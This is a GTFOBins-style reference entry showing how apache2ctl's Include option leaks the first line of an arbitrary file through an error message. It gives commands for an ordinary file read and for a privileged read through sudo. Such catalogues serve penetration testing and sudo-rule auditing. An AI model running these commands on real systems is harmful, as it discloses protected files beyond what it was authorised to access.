# GTFOBin: apache2ctl

This includes the file in the actual configuration file, the first line is leaked as an error message.

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
apache2ctl -c "Include $LFILE" -k stop
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
sudo apache2ctl -c "Include $LFILE" -k stop
```